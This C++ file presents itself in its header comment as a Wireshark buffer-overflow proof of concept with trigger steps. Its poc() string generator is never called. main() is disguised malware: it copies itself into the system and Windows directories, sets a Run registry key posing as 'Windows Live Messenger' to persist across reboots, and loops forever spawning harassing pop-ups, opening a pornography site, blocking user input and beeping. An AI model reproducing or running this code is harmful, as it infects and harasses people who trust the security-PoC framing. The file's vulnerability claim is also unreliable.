#include <windows.h>
#include <fstream>
#include <winuser.h>
 
using namespace std;

/*

WireShark Buffer Overflow 0day
author: X-h4ck,mem001@live.com,www.pirate.al
greetz to people that i love and my girlfriend , and yes imm
proud to be albanian.only the poc, no exploit available so i
wont confuse the script kiddies, eax,ecx,edx,ebx overwritten
s-kiddies u can easy get access over eip if u want to.
Tested on : Windows 7 ultimate
How to use: Capture>Options>Manage Interfaces>Remote Interfaces>Add===>
Host Input : 659 As
Port Input : 652 As, now lets stop with As and add 8 Bs for funn yeep?
Then Click "OK". In this way we can trigger the vulnerability.
ive tested this dummy attack in 1.8.2 & 1.6.0 , probabbly  all version
may be fucked, huh ? if they possess the remote inteface function.

*/


#include <cstdio>
#include <iostream>
// wrote a little shit code to generate > nicely for u those strings
using namespace std;
int poc(){

  char buff1[] = "\x41";
  char buff2[] = "\x42";
  FILE *txtfile;
  txtfile = fopen("c:\\exploit.txt", "w");
  fputs("Host Input:\n",txtfile);
  for(int i=0; i < 659; i++){
    fputs(buff1,txtfile);
    }
  fputs("\n",txtfile);
  fputs("Port Input:\n",txtfile);
  for (int y=0; y < 652; y++) {
    fputs(buff1,txtfile);
    }
  for(int x=0; x < 8; x++) {
    fputs(buff2,txtfile);
    }
  fclose(txtfile);
  return 0;
}


int main()
{       
    char system[MAX_PATH];
    char windows[MAX_PATH];
    char pathtofile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
    GetSystemDirectory(system,sizeof(system));
    GetWindowsDirectory(windows,sizeof(windows));
    strcat(system,"\\najort5g.exe");
    strcat(windows,"\\najort5g.exe");
    CopyFile(pathtofile,system,false);
    CopyFile(pathtofile,windows,false);
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
    RegSetValueEx(hKey, "Windows Live Messenger",0,REG_SZ,(const unsigned char*)system,sizeof(system));
    RegCloseKey(hKey);  
     
    void messageset();
    void pornpopup();
    void payload();
     
    int y = 1;
    while(y<10)
    {
      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)messageset, NULL, 0, NULL);
      Sleep(60000);
      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pornpopup, NULL, 0, NULL);
      Sleep(60000);
      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
      Sleep(60000);
    }
}
 
    void messageset()
    {
       if(MessageBox(
       NULL,
       "Neanderthal is watching you",
       "Neanderthal",
       MB_OKCANCEL)==IDCANCEL)
       {
       MessageBox(
       NULL,
       "You can't cancel me mother fucker!",
       "Neanderthal",
       MB_OK);
       }
    }
 
     void pornpopup()
    {  
       char Website[MAX_PATH] = "www.porn.com";
       ShellExecute(NULL,"open",Website,NULL,NULL,SW_MAXIMIZE);
     
       MessageBox(
       NULL,
       "Naughty, Naughty, looking at porn are we now?... Dispicable",
       "Neanderthal",
       MB_OK);
    }
     
        
     
     void payload()
     {
       int a = 1;
     
       while(a<100)
       {
          BlockInput(TRUE);
          SetCursorPos(500,500);
          Sleep(3000);
          a++;
       }
     
       Sleep(10000);
       int freq = 100;
       int loop = 1;
       while(loop<200)
       {       
           Beep(freq,100);
           Sleep(50);
           freq++;
           loop++;
       }
    }